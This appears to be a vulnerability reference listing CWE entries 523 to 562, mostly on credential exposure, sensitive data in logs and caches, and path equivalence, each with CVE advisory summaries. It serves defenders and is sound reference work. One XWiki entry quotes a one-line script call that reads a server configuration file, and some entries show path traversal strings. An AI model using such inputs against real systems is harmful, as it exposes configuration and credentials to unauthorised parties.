CVE-2022-29089: Dell Networking OS10, versions prior to October 2021 with Smart Fabric Services enabled, contains an information disclosure vulnerability. A remote, unauthenticated attacker could potentially exploit this vulnerability by reverse engineering to retrieve sensitive information and access the REST API with admin privileges.

CVE-2022-29507: Insufficiently protected credentials in the Intel(R) Team Blue mobile application in all versions may allow an authenticated user to potentially enable information disclosure via local access.

CVE-2022-2967: Prosys OPC UA Simulation Server version prior to v5.3.0-64 and UA Modbus Server versions 1.4.18-5 and prior do not sufficiently protect credentials, which could allow an attacker to obtain user credentials and gain access to system data.

CVE-2022-29833: Insufficiently Protected Credentials vulnerability in Mitsubishi Electric Corporation GX Works3 versions 1.015R and later allows a remote unauthenticated attacker to disclose sensitive information. As a result, unauthenticated users could access to MELSEC safety CPU modules illgally.

CVE-2022-29839: Insufficiently Protected Credentials vulnerability in the remote backups application on Western Digital My Cloud devices that could allow an attacker who has gained access to a relevant endpoint to use that information to access protected data. This issue affects: Western Digital My Cloud My Cloud versions prior to 5.25.124 on Linux.

CVE-2022-30296: Insufficiently protected credentials in the Intel(R) Datacenter Group Event iOS application, all versions, may allow an unauthenticated user to potentially enable information disclosure via network access.

CVE-2022-30601: Insufficiently protected credentials for Intel(R) AMT and Intel(R) Standard Manageability may allow an unauthenticated user to potentially enable information disclosure and escalation of privilege via network access.

CVE-2022-30587: Gradle Enterprise through 2022.2.2 has Incorrect Access Control that leads to information disclosure.

# CWE-523 Unprotected Transport of Credentials

## Description

Login pages do not use adequate measures to protect the user name and password while they are in transit from the client to the server.

SSL (Secure Socket Layer) provides data confidentiality and integrity to HTTP. By encrypting HTTP messages, SSL protects from attackers eavesdropping or altering message contents.

## Top 25 Examples

CVE-2021-20826: Unprotected transport of credentials vulnerability in IDEC PLCs (FC6A Series MICROSmart All-in-One CPU module v2.32 and earlier, FC6A Series MICROSmart Plus CPU module v1.91 and earlier, WindLDR v8.19.1 and earlier, WindEDIT Lite v1.3.1 and earlier, and Data File Manager v2.12.1 and earlier) allows an attacker to obtain the PLC Web server user credentials from the communication between the PLC and the software. As a result, the complete access privileges to the PLC Web server may be obtained, and manipulation of the PLC output and/or suspension of the PLC may be conducted.

CVE-2022-34371: Dell PowerScale OneFS, versions 9.0.0 up to and including 9.1.0.19, 9.2.1.12, 9.3.0.6, and 9.4.0.3, contain an unprotected transport of credentials vulnerability. A malicious unprivileged network attacker could potentially exploit this vulnerability, leading to full system compromise.

# CWE-524 Use of Cache Containing Sensitive Information

## Description

The code uses a cache that contains sensitive information, but the cache can be read by an actor outside of the intended control sphere.

Applications may use caches to improve efficiency when communicating with remote entities or performing intensive calculations. A cache maintains a pool of objects, threads, connections, pages, financial data, passwords, or other resources to minimize the time it takes to initialize and access these resources. If the cache is accessible to unauthorized actors, attackers can read the cache and obtain this sensitive information.

## Top 25 Examples

CVE-2021-44854: An issue was discovered in MediaWiki before 1.35.5, 1.36.x before 1.36.3, and 1.37.x before 1.37.1. The REST API publicly caches results from private wikis.

CVE-2022-23498: Grafana is an open-source platform for monitoring and observability. When datasource query caching is enabled, Grafana caches all headers, including `grafana_session`. As a result, any user that queries a datasource where the caching is enabled can acquire another user’s session. To mitigate the vulnerability you can disable datasource query caching for all datasources. This issue has been patched in versions 9.2.10 and 9.3.4. 

# CWE-525 Use of Web Browser Cache Containing Sensitive Information

## Description

The web application does not use an appropriate caching policy that specifies the extent to which each web page and associated form fields should be cached.

## Top 25 Examples

CVE-2022-24742: Sylius is an open source eCommerce platform. Prior to versions 1.9.10, 1.10.11, and 1.11.2, any other user can view the data if browser tab remains unclosed after log out. The issue is fixed in versions 1.9.10, 1.10.11, and 1.11.2. A workaround is available. The application must strictly redirect to login page even browser back button is pressed. Another possibility is to set more strict cache policies for restricted content.

CVE-2022-24747: Shopware is an open commerce platform based on the Symfony php Framework and the Vue javascript framework. Affected versions of shopware do no properly set sensitive HTTP headers to be non-cacheable. If there is an HTTP cache between the server and client then headers may be exposed via HTTP caches. This issue has been resolved in version 6.4.8.2. There are no known workarounds.

# CWE-526 Cleartext Storage of Sensitive Information in an Environment Variable

## Description

The product uses an environment variable to store unencrypted sensitive information.

Information stored in an environment variable can be accessible by other processes with the execution context, including child processes that dependencies are executed in, or serverless functions in cloud environments. An environment variable's contents can also be inserted into messages, headers, log files, or other outputs. Often these other dependencies have no need to use the environment variable in question. A weakness that discloses environment variables could expose this information.

## Observed Examples

CVE-2022-43691: CMS shows sensitive server-side information from environment variables when run in Debug mode.

CVE-2022-27195: Plugin for an automation server inserts environment variable contents into build XML files.

CVE-2022-25264: CI/CD tool logs environment variables related to passwords add Contribution to content history.

## Top 25 Examples

CVE-2022-46155: Airtable.js is the JavaScript client for Airtable. Prior to version 0.11.6, Airtable.js had a misconfigured build script in its source package. When the build script is run, it would bundle environment variables into the build target of a transpiled bundle. Specifically, the AIRTABLE_API_KEY and AIRTABLE_ENDPOINT_URL environment variables are inserted during Browserify builds due to being referenced in Airtable.js code. This only affects copies of Airtable.js built from its source, not those installed via npm or yarn. Airtable API keys set in users’ environments via the AIRTABLE_API_KEY environment variable may be bundled into local copies of Airtable.js source code if all of the following conditions are met: 1) the user has cloned the Airtable.js source onto their machine, 2) the user runs the `npm prepare` script, and 3) the user' has the AIRTABLE_API_KEY environment variable set. If these conditions are met, a user’s local build of Airtable.js would be modified to include the value of the AIRTABLE_API_KEY environment variable, which could then be accidentally shipped in the bundled code. Users who do not meet all three of these conditions are not impacted by this issue. Users should upgrade to Airtable.js version 0.11.6 or higher; or, as a workaround unset the AIRTABLE_API_KEY environment variable in their shell and/or remove it from your .bashrc, .zshrc, or other shell configuration files. Users should also regenerate any Airtable API keys they use, as the keysy may be present in bundled code.

CVE-2022-2739: The version of podman as released for Red Hat Enterprise Linux 7 Extras via RHSA-2022:2190 advisory included an incorrect version of podman missing the fix for CVE-2020-14370, which was previously fixed via RHSA-2020:5056. This issue could possibly allow an attacker to gain access to sensitive information stored in environment variables.

# CWE-527 Exposure of Version-Control Repository to an Unauthorized Control Sphere

## Description

The product stores a CVS, git, or other repository in a directory, archive, or other resource that is stored, transferred, or otherwise made accessible to unauthorized actors.

Version control repositories such as CVS or git store version-specific metadata and other details within subdirectories. If these subdirectories are stored on a web server or added to an archive, then these could be used by an attacker. This information may include usernames, filenames, path root, IP addresses, and detailed "diff" data about how files have been changed - which could reveal source code snippets that were never intended to be made public.

# CWE-528 Exposure of Core Dump File to an Unauthorized Control Sphere

## Description

The product generates a core dump file in a directory, archive, or other resource that is stored, transferred, or otherwise made accessible to unauthorized actors.

# CWE-529 Exposure of Access Control List Files to an Unauthorized Control Sphere

## Description

The product stores access control list files in a directory or other container that is accessible to actors outside of the intended control sphere.

Exposure of these access control list files may give the attacker information about the configuration of the site or system. This information may then be used to bypass the intended security policy or identify trusted systems from which an attack can be launched.

# CWE-53 Path Equivalence: '\multiple\\internal\backslash'

## Description

The product accepts path input in the form of multiple internal backslash ('\multiple\trailing\\slash') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.

# CWE-530 Exposure of Backup File to an Unauthorized Control Sphere

## Description

A backup file is stored in a directory or archive that is made accessible to unauthorized actors.

Often, older backup files are renamed with an extension such as .~bk to distinguish them from production files. The source code for old files that have been renamed in this manner and left in the webroot can often be retrieved. This renaming may have been performed automatically by the web server, or manually by the administrator.

# CWE-531 Inclusion of Sensitive Information in Test Code

## Description

Accessible test applications can pose a variety of security risks. Since developers or administrators rarely consider that someone besides themselves would even know about the existence of these applications, it is common for them to contain sensitive information or functions.

# CWE-532 Insertion of Sensitive Information into Log File

## Description

Information written to log files can be of a sensitive nature and give valuable guidance to an attacker or expose sensitive user information.

While logging all information may be helpful during development stages, it is important that logging levels be set appropriately before a product ships so that sensitive user data and system information are not accidentally exposed to potential attackers.


Different log files may be produced and stored for:


  - Server log files (e.g. server.log). This can give information on whatever application left the file. Usually this can give full path names and system information, and sometimes usernames and passwords.

  - log files that are used for debugging

## Observed Examples

CVE-2017-9615: verbose logging stores admin credentials in a world-readable log file

CVE-2018-1999036: SSH password for private key stored in build log

## Top 25 Examples

CVE-2022-23506: Spinnaker is an open source, multi-cloud continuous delivery platform for releasing software changes, and Spinnaker's Rosco microservice produces machine images. Rosco prior to versions 1.29.2, 1.28.4, and 1.27.3 does not property mask secrets generated via packer builds. This can lead to exposure of sensitive AWS credentials in packer log files. Versions 1.29.2, 1.28.4, and 1.27.3 of Rosco contain fixes for this issue. A workaround is available. It's recommended to use short lived credentials via role assumption and IAM profiles. Additionally, credentials can be set in `/home/spinnaker/.aws/credentials` and `/home/spinnaker/.aws/config` as a volume mount for Rosco pods vs. setting credentials in roscos bake config properties. Last even with those it's recommend to use IAM Roles vs. long lived credentials. This drastically mitigates the risk of credentials exposure. If users have used static credentials, it's recommended to purge any bake logs for AWS, evaluate whether AWS_ACCESS_KEY, SECRET_KEY and/or other sensitive data has been introduced in log files and bake job logs. Then, rotate these credentials and evaluate potential improper use of those credentials.

CVE-2021-3684: A vulnerability was found in OpenShift Assisted Installer. During generation of the Discovery ISO, image pull secrets were leaked as plaintext in the installation logs. An authenticated user could exploit this by re-using the image pull secret to pull container images from the registry as the associated user.

CVE-2022-0021: An information exposure through log file vulnerability exists in the Palo Alto Networks GlobalProtect app on Windows that logs the cleartext credentials of the connecting GlobalProtect user when authenticating using Connect Before Logon feature. This issue impacts GlobalProtect App 5.2 versions earlier than 5.2.9 on Windows. This issue does not affect the GlobalProtect app on other platforms.

CVE-2022-0652: Confd log files contain local users', including root’s, SHA512crypt password hashes with insecure access permissions. This allows a local attacker to attempt off-line brute-force attacks against these password hashes in Sophos UTM before version 9.710.

CVE-2022-0718: A flaw was found in python-oslo-utils. Due to improper parsing, passwords with a double quote ( " ) in them cause incorrect masking in debug logs, causing any part of the password after the double quote to be plaintext.

CVE-2022-0725: A flaw was found in keepass. The vulnerability occurs due to logging the plain text passwords in system log and leads to an Information Exposure vulnerability. This flaw allows an attacker to interact and read sensitive passwords and logs.

CVE-2022-20630: A vulnerability in the audit log of Cisco DNA Center could allow an authenticated, local attacker to view sensitive information in clear text. This vulnerability is due to the unsecured logging of sensitive information on an affected system. An attacker with administrative privileges could exploit this vulnerability by accessing the audit logs through the CLI. A successful exploit could allow the attacker to retrieve sensitive information that includes user credentials.

CVE-2022-33737: The OpenVPN Access Server installer creates a log file readable for everyone, which from version 2.10.0 and before 2.11.0 may contain a random generated admin password

CVE-2022-34826: In Couchbase Server 7.1.x before 7.1.1, an encrypted Private Key passphrase may be leaked in the logs.

CVE-2022-20458: The logs of sensitive information (PII) or hardware identifier should only be printed in Android "userdebug" or "eng" build. StatusBarNotification.getKey() could contain sensitive information. However, CarNotificationListener.java, it prints out the StatusBarNotification.getKey() directly in logs, which could contain user's account name (i.e. PII), in Android "user" build.Product: AndroidVersions: Android-12LAndroid ID: A-205567776

CVE-2022-20651: A vulnerability in the logging component of Cisco Adaptive Security Device Manager (ASDM) could allow an authenticated, local attacker to view sensitive information in clear text on an affected system. Cisco ADSM must be deployed in a shared workstation environment for this issue to be exploited. This vulnerability is due to the storage of unencrypted credentials in certain logs. An attacker could exploit this vulnerability by accessing the logs on an affected system. A successful exploit could allow the attacker to view the credentials of other users of the shared device.

CVE-2022-31098: Weave GitOps is a simple open source developer platform for people who want cloud native applications, without needing Kubernetes expertise. A vulnerability in the logging of Weave GitOps could allow an authenticated remote attacker to view sensitive cluster configurations, aka KubeConfg, of registered Kubernetes clusters, including the service account tokens in plain text from Weave GitOps's pod logs on the management cluster. An unauthorized remote attacker can also view these sensitive configurations from external log storage if enabled by the management cluster. This vulnerability is due to the client factory dumping cluster configurations and their service account tokens when the cluster manager tries to connect to an API server of a registered cluster, and a connection error occurs. An attacker could exploit this vulnerability by either accessing logs of a pod of Weave GitOps, or from external log storage and obtaining all cluster configurations of registered clusters. A successful exploit could allow the attacker to use those cluster configurations to manage the registered Kubernetes clusters. This vulnerability has been fixed by commit 567356f471353fb5c676c77f5abc2a04631d50ca. Users should upgrade to Weave GitOps core version v0.8.1-rc.6 or newer. There is no known workaround for this vulnerability.

CVE-2022-0338: Insertion of Sensitive Information into Log File in Conda loguru prior to 0.5.3. 

CVE-2021-39715: In __show_regs of process.c, there is a possible leak of kernel memory and addresses due to log information disclosure. This could lead to local information disclosure with System execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android kernelAndroid ID: A-178379135References: Upstream kernel

CVE-2022-29869: cifs-utils through 6.14, with verbose logging, can cause an information leak when a file contains = (equal sign) characters but is not a valid credentials file.

CVE-2022-3018: An information disclosure vulnerability in GitLab CE/EE affecting all versions starting from 9.3 before 15.2.5, all versions starting from 15.3 before 15.3.4, all versions starting from 15.4 before 15.4.1 allows a project maintainer to access the DataDog integration API key from webhook logs.

CVE-2022-2394: Puppet Bolt prior to version 3.24.0 will print sensitive parameters when planning a run resulting in them potentially being logged when run programmatically, such as via Puppet Enterprise.

CVE-2022-25823: Information Exposure vulnerability in Galaxy Watch Plugin prior to version 2.2.05.220126741 allows attackers to access user information in log.

CVE-2022-25826: Information Exposure vulnerability in Galaxy S3 Plugin prior to version 2.2.03.22012751 allows attacker to access password information of connected WiFiAp in the log

CVE-2022-25827: Information Exposure vulnerability in Galaxy Watch Plugin prior to version 2.2.05.22012751 allows attacker to access password information of connected WiFiAp in the log

CVE-2022-25828: Information Exposure vulnerability in Watch Active Plugin prior to version 2.2.07.22012751 allows attacker to access password information of connected WiFiAp in the log

CVE-2022-25829: Information Exposure vulnerability in Watch Active2 Plugin prior to version 2.2.08.22012751 allows attacker to access password information of connected WiFiAp in the log

CVE-2022-25830: Information Exposure vulnerability in Galaxy Watch3 Plugin prior to version 2.2.09.22012751 allows attacker to access password information of connected WiFiAp in the log

CVE-2022-27192: The Reporting module in Aseco Lietuva document management system DVS Avilys before 3.5.58 allows unauthorized file download. An unauthenticated attacker can impersonate an administrator by reading administrative files.

CVE-2022-29071: This advisory documents an internally found vulnerability in the on premises deployment model of Arista CloudVision Portal (CVP) where under a certain set of conditions, user passwords can be leaked in the Audit and System logs. The impact of this vulnerability is that the CVP user login passwords might be leaked to other authenticated users.

CVE-2022-39043: Juiker app stores debug logs which contains sensitive information to mobile external storage. An unauthenticated physical attacker can access these files to acquire partial user information such as personal contacts.

CVE-2022-42439:  IBM App Connect Enterprise 11.0.0.17 through 11.0.0.19 and 12.0.4.0 and 12.0.5.0 contains an unspecified vulnerability in the Discovery Connector nodes which may cause a 3rd party system’s credentials to be exposed to a privileged attacker. IBM X-Force ID: 238211. 

# CWE-535 Exposure of Information Through Shell Error Message

## Description

A command shell error message indicates that there exists an unhandled exception in the web application code. In many cases, an attacker can leverage the conditions that cause these errors in order to gain unauthorized access to the system.

# CWE-536 Servlet Runtime Error Message Containing Sensitive Information

## Description

A servlet error message indicates that there exists an unhandled exception in your web application code and may provide useful information to an attacker.

# CWE-537 Java Runtime Error Message Containing Sensitive Information

## Description

In many cases, an attacker can leverage the conditions that cause unhandled exception errors in order to gain unauthorized access to the system.

# CWE-538 Insertion of Sensitive Information into Externally-Accessible File or Directory

## Description

The product places sensitive information into files or directories that are accessible to actors who are allowed to have access to the files, but not to the sensitive information.

## Observed Examples

CVE-2018-1999036: SSH password for private key stored in build log

## Top 25 Examples

CVE-2021-40363: A vulnerability has been identified in SIMATIC PCS 7 V8.2 (All versions), SIMATIC PCS 7 V9.0 (All versions), SIMATIC PCS 7 V9.1 (All versions < V9.1 SP1), SIMATIC WinCC V15 and earlier (All versions < V15 SP1 Update 7), SIMATIC WinCC V16 (All versions < V16 Update 5), SIMATIC WinCC V17 (All versions < V17 Update 2), SIMATIC WinCC V17 (All versions <= V17 Update 4), SIMATIC WinCC V7.4 (All versions < V7.4 SP1 Update 19), SIMATIC WinCC V7.5 (All versions < V7.5 SP2 Update 6). The affected component stores the credentials of a local system account in a potentially publicly accessible project file using an outdated cipher algorithm. An attacker may use this to brute force the credentials and take over the system.

CVE-2022-27195: Jenkins Parameterized Trigger Plugin 2.43 and earlier captures environment variables passed to builds triggered using Jenkins Parameterized Trigger Plugin, including password parameter values, in their `build.xml` files. These values are stored unencrypted and can be viewed by users with access to the Jenkins controller file system.

CVE-2022-0013: A file information exposure vulnerability exists in the Palo Alto Networks Cortex XDR agent that enables a local attacker to read the contents of arbitrary files on the system with elevated privileges when generating a support file. This issue impacts: Cortex XDR agent 5.0 versions earlier than Cortex XDR agent 5.0.12; Cortex XDR agent 6.1 versions earlier than Cortex XDR agent 6.1.9; Cortex XDR agent 7.2 versions earlier than Cortex XDR agent 7.2.4; Cortex XDR agent 7.3 versions earlier than Cortex XDR agent 7.3.2.

CVE-2022-24782: Discourse is an open source discussion platform. Versions 2.8.2 and prior in the `stable` branch, 2.9.0.beta3 and prior in the `beta` branch, and 2.9.0.beta3 and prior in the `tests-passed` branch are vulnerable to a data leak. Users can request an export of their own activity. Sometimes, due to category settings, they may have category membership for a secure category. The name of this secure category is shown to the user in the export. The same thing occurs when the user's post has been moved to a secure category. A patch for this issue is available in the `main` branch of Discourse's GitHub repository and is anticipated to be part of future releases.

# CWE-539 Use of Persistent Cookies Containing Sensitive Information

## Description

The web application uses persistent cookies, but the cookies contain sensitive information.

Cookies are small bits of data that are sent by the web application but stored locally in the browser. This lets the application use the cookie to pass information between pages and store variable information. The web application controls what information is stored in a cookie and how it is used. Typical types of information stored in cookies are session identifiers, personalization and customization information, and in rare cases even usernames to enable automated logins. There are two different types of cookies: session cookies and persistent cookies. Session cookies just live in the browser's memory and are not stored anywhere, but persistent cookies are stored on the browser's hard drive. This can cause security and privacy issues depending on the information stored in the cookie and how it is accessed.

# CWE-54 Path Equivalence: 'filedir\' (Trailing Backslash)

## Description

The product accepts path input in the form of trailing backslash ('filedir\') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.

## Observed Examples

CVE-2004-0847: web framework for .NET allows remote attackers to bypass authentication for .aspx files in restricted directories via a request containing a (1) "\" (backslash) or (2) "%5C" (encoded backslash)

CVE-2004-0061: Bypass directory access restrictions using trailing dot in URL

# CWE-540 Inclusion of Sensitive Information in Source Code

## Description

Source code on a web server or repository often contains sensitive information and should generally not be accessible to users.

There are situations where it is critical to remove source code from an area or server. For example, obtaining Perl source code on a system allows an attacker to understand the logic of the script and extract extremely useful information such as code bugs or logins and passwords.

## Observed Examples

CVE-2022-25512: Server for Team Awareness Kit (TAK) application includes sensitive tokens in the JavaScript source code.

CVE-2022-24867: The LDAP password might be visible in the html code of a rendered page in an IT Asset Management tool.

CVE-2007-6197: Version numbers and internal hostnames leaked in HTML comments.

## Top 25 Examples

CVE-2022-24867: GLPI is a Free Asset and IT Management Software package, that provides ITIL Service Desk features, licenses tracking and software auditing. When you pass the config to the javascript, some entries are filtered out. The variable ldap_pass is not filtered and when you look at the source code of the rendered page, we can see the password for the root dn. Users are advised to upgrade. There is no known workaround for this issue.

CVE-2022-43959: Insufficiently Protected Credentials in the AD/LDAP server settings in 1C-Bitrix Bitrix24 through 22.200.200 allow remote administrators to discover an AD/LDAP administrative password by reading the source code of /bitrix/admin/ldap_server_edit.php.

CVE-2022-25512: FreeTAKServer-UI v1.9.8 was discovered to leak sensitive API and Websocket keys.

# CWE-541 Inclusion of Sensitive Information in an Include File

## Description

If an include file source is accessible, the file can contain usernames and passwords, as well as sensitive information pertaining to the application and system.

# CWE-543 Use of Singleton Pattern Without Synchronization in a Multithreaded Context

## Description

The product uses the singleton pattern when creating a resource within a multithreaded environment.

The use of a singleton pattern may not be thread-safe.

# CWE-544 Missing Standardized Error Handling Mechanism

## Description

The product does not use a standardized method for handling errors throughout the code, which might introduce inconsistent error handling and resultant weaknesses.

If the product handles error messages individually, on a one-by-one basis, this is likely to result in inconsistent error handling. The causes of errors may be lost. Also, detailed information about the causes of an error may be unintentionally returned to the user.

# CWE-546 Suspicious Comment

## Description

The code contains comments that suggest the presence of bugs, incomplete functionality, or weaknesses.

Many suspicious comments, such as BUG, HACK, FIXME, LATER, LATER2, TODO, in the code indicate missing security functionality and checking. Others indicate code problems that programmers should fix, such as hard-coded variables, error handling, not using stored procedures, and performance issues.

# CWE-547 Use of Hard-coded, Security-relevant Constants

## Description

The product uses hard-coded constants instead of symbolic names for security-critical values, which increases the likelihood of mistakes during code maintenance or security policy change.

If the developer does not find all occurrences of the hard-coded constants, an incorrect policy decision may be made if one of the constants is not changed. Making changes to these values will require code changes that may be difficult or impossible once the system is released to the field. In addition, these hard-coded values may become available to attackers if the code is ever disclosed.

# CWE-548 Exposure of Information Through Directory Listing

## Description

A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers.

A directory listing provides an attacker with the complete index of all the resources located inside of the directory. The specific risks and consequences vary depending on which files are listed and accessible.

## Top 25 Examples

CVE-2021-21528: Dell EMC PowerScale OneFS versions 9.1.0, 9.2.0.x, 9.2.1.x contain an Exposure of Information through Directory Listing vulnerability. This vulnerability is triggered when upgrading from a previous versions.

CVE-2021-45421: Emerson Dixell XWEB-500 products are affected by information disclosure via directory listing. A potential attacker can use this misconfiguration to access all the files in the remote directories. Note: the product has not been supported since 2018 and should be removed or replaced

CVE-2022-2558: The Simple Job Board WordPress plugin before 2.10.0 is susceptible to Directory Listing which allows the public listing of uploaded resumes in certain configurations.

CVE-2022-30625: Directory listing is a web server function that displays the directory contents when there is no index file in a specific website directory. A directory listing provides an attacker with the complete index of all the resources located inside of the directory. The specific risks and consequences vary depending on which files are listed and accessible.

# CWE-549 Missing Password Field Masking

## Description

The product does not mask passwords during entry, increasing the potential for attackers to observe and capture passwords.

## Top 25 Examples

CVE-2022-1413: Missing input masking in GitLab CE/EE affecting all versions starting from 1.0.2 before 14.8.6, all versions from 14.9.0 before 14.9.4, and all versions from 14.10.0 before 14.10.1 causes potentially sensitive integration properties to be disclosed in the web interface

CVE-2022-38663: Jenkins Git Plugin 4.11.4 and earlier does not properly mask (i.e., replace with asterisks) credentials in the build log provided by the Git Username and Password (`gitUsernamePassword`) credentials binding.

CVE-2022-1342: A lack of password masking in Devolutions Remote Desktop Manager allows physically proximate attackers to observe sensitive data. A caching issue can cause sensitive fields to sometimes stay revealed when closing and reopening a panel, which could lead to involuntarily disclosing sensitive information. This issue affects: Devolutions Remote Desktop Manager 2022.1.24 version and prior versions.

CVE-2022-20914: A vulnerability in the External RESTful Services (ERS) API of Cisco Identity Services Engine (ISE) Software could allow an authenticated, remote attacker to obtain sensitive information. This vulnerability is due to excessive verbosity in a specific REST API output. An attacker could exploit this vulnerability by sending a crafted HTTP request to the affected device. A successful exploit could allow the attacker to obtain sensitive information, including administrative credentials for an external authentication server. Note: To successfully exploit this vulnerability, the attacker must have valid ERS administrative credentials.

CVE-2022-22550: Dell PowerScale OneFS, versions 8.2.2 and above, contain a password disclosure vulnerability. An unprivileged local attacker could potentially exploit this vulnerability, leading to account take over.

CVE-2022-23109: Jenkins HashiCorp Vault Plugin 3.7.0 and earlier does not mask Vault credentials in Pipeline build logs or in Pipeline step descriptions when Pipeline: Groovy Plugin 2.85 or later is installed.

# CWE-55 Path Equivalence: '/./' (Single Dot Directory)

## Description

The product accepts path input in the form of single dot directory exploit ('/./') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.

## Observed Examples

CVE-2000-0004: Server allows remote attackers to read source code for executable files by inserting a . (dot) into the URL.

CVE-2002-0304: Server allows remote attackers to read password-protected files via a /./ in the HTTP request.

CVE-1999-1083: Possibly (could be a cleansing error)

CVE-2004-0815: "/./////etc" cleansed to ".///etc" then "/etc"

CVE-2002-0112: Server allows remote attackers to view password protected files via /./ in the URL.

## Top 25 Examples

CVE-2021-40539: Zoho ManageEngine ADSelfService Plus version 6113 and prior is vulnerable to REST API authentication bypass with resultant remote code execution.

# CWE-550 Server-generated Error Message Containing Sensitive Information

## Description

Certain conditions, such as network failure, will cause a server error message to be displayed.

While error messages in and of themselves are not dangerous, per se, it is what an attacker can glean from them that might cause eventual problems.

# CWE-551 Incorrect Behavior Order: Authorization Before Parsing and Canonicalization

## Description

If a web server does not fully parse requested URLs before it examines them for authorization, it may be possible for an attacker to bypass authorization protection.

For instance, the character strings /./ and / both mean current directory. If /SomeDirectory is a protected directory and an attacker requests /./SomeDirectory, the attacker may be able to gain access to the resource if /./ is not converted to / before the authorization check is performed.

## Top 25 Examples

CVE-2021-32777: Envoy is an open source L7 proxy and communication bus designed for large modern service oriented architectures. In affected versions when ext-authz extension is sending request headers to the external authorization service it must merge multiple value headers according to the HTTP spec. However, only the last header value is sent. This may allow specifically crafted requests to bypass authorization. Attackers may be able to escalate privileges when using ext-authz extension or back end service that uses multiple value headers for authorization. A specifically constructed request may be delivered by an untrusted downstream peer in the presence of ext-authz extension. Envoy versions 1.19.1, 1.18.4, 1.17.4, 1.16.5 contain fixes to the ext-authz extension to correctly merge multiple request header values, when sending request for authorization.

# CWE-552 Files or Directories Accessible to External Parties

## Description

The product makes files or directories accessible to unauthorized actors, even though they should not be.

Web servers, FTP servers, and similar servers may store a set of files underneath a "root" directory that is accessible to the server's users. Applications may store sensitive files underneath this root without also using access control to limit which users may request those files, if any. Alternately, an application might package multiple files or directories into an archive file (e.g., ZIP or tar), but the application might not exclude sensitive files that are underneath those directories.


In cloud technologies and containers, this weakness might present itself in the form of misconfigured storage accounts that can be read or written by a public or anonymous user.

## Observed Examples

CVE-2005-1835: Data file under web root.

## Top 25 Examples

CVE-2022-23508: Weave GitOps is a simple open source developer platform for people who want cloud native applications, without needing Kubernetes expertise. A vulnerability in GitOps run could allow a local user or process to alter a Kubernetes cluster's resources. GitOps run has a local S3 bucket which it uses for synchronizing files that are later applied against a Kubernetes cluster. Its endpoint had no security controls to block unauthorized access, therefore allowing local users (and processes) on the same machine to see and alter the bucket content. By leveraging this vulnerability, an attacker could pick a workload of their choosing and inject it into the S3 bucket, which resulted in the successful deployment in the target cluster, without the need to provide any credentials to either the S3 bucket nor the target Kubernetes cluster. There are no known workarounds for this issue, please upgrade. This vulnerability has been fixed by commits 75268c4 and 966823b. Users should upgrade to Weave GitOps version >= v0.12.0 released on 08/12/2022. ### Workarounds There is no workaround for this vulnerability. ### References Disclosed by Paulo Gomes, Senior Software Engineer, Weaveworks. ### For more information If you have any questions or comments about this advisory: - Open an issue in [Weave GitOps repository](https://github.com/weaveworks/weave-gitops) - Email us at [support@weave.works](mailto:support@weave.works) 

CVE-2021-25004: The SEUR Oficial WordPress plugin before 1.7.2 creates a PHP file with a random name when installed, even though it is used for support purposes, it allows to download any file from the web server without restriction after knowing the URL and a password than an administrator can see in the plugin settings page.

CVE-2022-23621: XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. In affected versions any user with SCRIPT right can read any file located in the XWiki WAR (for example xwiki.cfg and xwiki.properties) through XWiki#invokeServletAndReturnAsString as `$xwiki.invokeServletAndReturnAsString("/WEB-INF/xwiki.cfg")`. This issue has been patched in XWiki versions 12.10.9, 13.4.3 and 13.7-rc-1. Users are advised to update. The only workaround is to limit SCRIPT right.

CVE-2022-2834: The Helpful WordPress plugin before 4.5.26 puts the exported logs and feedbacks in a publicly accessible location and guessable names, which could allow attackers to download them and retrieve sensitive information such as IP, Names and Email Address depending on the plugin's settings

# CWE-553 Command Shell in Externally Accessible Directory

## Description

A possible shell file exists in /cgi-bin/ or other accessible directories. This is extremely dangerous and can be used by an attacker to execute commands on the web server.

# CWE-554 ASP.NET Misconfiguration: Not Using Input Validation Framework

## Description

The ASP.NET application does not use an input validation framework.

# CWE-555 J2EE Misconfiguration: Plaintext Password in Configuration File

## Description

The J2EE application stores a plaintext password in a configuration file.

Storing a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resource, making it an easy target for attackers.

# CWE-556 ASP.NET Misconfiguration: Use of Identity Impersonation

## Description

Configuring an ASP.NET application to run with impersonated credentials may give the application unnecessary privileges.

The use of impersonated credentials allows an ASP.NET application to run with either the privileges of the client on whose behalf it is executing or with arbitrary privileges granted in its configuration.

# CWE-558 Use of getlogin() in Multithreaded Application

## Description

The product uses the getlogin() function in a multithreaded context, potentially causing it to return incorrect values.

The getlogin() function returns a pointer to a string that contains the name of the user associated with the calling process. The function is not reentrant, meaning that if it is called from another process, the contents are not locked out and the value of the string can be changed by another process. This makes it very risky to use because the username can be changed by other processes, so the results of the function cannot be trusted.

# CWE-56 Path Equivalence: 'filedir*' (Wildcard)

## Description

The product accepts path input in the form of asterisk wildcard ('filedir*') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.

## Observed Examples

CVE-2004-0696: List directories using desired path and "*"

CVE-2002-0433: List files in web server using "*.ext"

# CWE-560 Use of umask() with chmod-style Argument

## Description

The product calls umask() with an incorrect argument that is specified as if it is an argument to chmod().

# CWE-561 Dead Code

## Description

The product contains dead code, which can never be executed.

Dead code is code that can never be executed in a running program. The surrounding code makes it impossible for a section of code to ever be executed.

## Observed Examples

CVE-2014-1266: chain: incorrect "goto" in Apple SSL product bypasses certificate validation, allowing Adversary-in-the-Middle (AITM) attack (Apple "goto fail" bug). CWE-705 (Incorrect Control Flow Scoping) -> CWE-561 (Dead Code) -> CWE-295 (Improper Certificate Validation) -> CWE-393 (Return of Wrong Status Code) -> CWE-300 (Channel Accessible by Non-Endpoint).

# CWE-562 Return of Stack Variable Address

## Description

A function returns the address of a stack variable, which will cause unintended program behavior, typically in the form of a crash.

Because local variables are allocated on the stack, when a program returns a pointer to a local variable, it is returning a stack address. A subsequent function call is likely to re-use this same stack address, thereby overwriting the value of the pointer, which no longer corresponds to the same variable since a function's stack frame is invalidated when it returns. At best this will cause the value of the pointer to change unexpectedly. In many cases it causes the program to crash the next time the pointer is dereferenced.

